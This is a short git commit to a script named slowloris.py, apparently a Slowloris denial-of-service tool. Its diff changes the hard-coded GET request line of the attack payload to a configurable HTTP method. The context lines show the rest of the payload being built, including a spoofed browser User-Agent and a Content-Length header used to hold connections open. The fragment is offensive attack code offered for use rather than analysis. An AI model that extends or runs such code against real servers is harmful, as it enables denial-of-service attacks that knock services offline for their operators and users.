dc4380f05d141a65a6c41e80ad76f50c05b5f38a
Misfortune <36631640+MisfortuneIsLit@users.noreply.github.com>
2019-12-17 23:13:56 +0000

    Update slowloris.py

--- slowloris.py
+++ slowloris.py
@@ -117,7 +117,7 @@ def doconnections():
 						else:
 							rand = ""
 
-						primarypayload = "GET /" + rand + " HTTP/1.1\r\n"
+						primarypayload = method + " /" + rand + " HTTP/1.1\r\n"
 						primarypayload += "Host: " + sendhost + "\r\n"
 						primarypayload += "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
 						primarypayload += "Content-Length: 42\r\n"
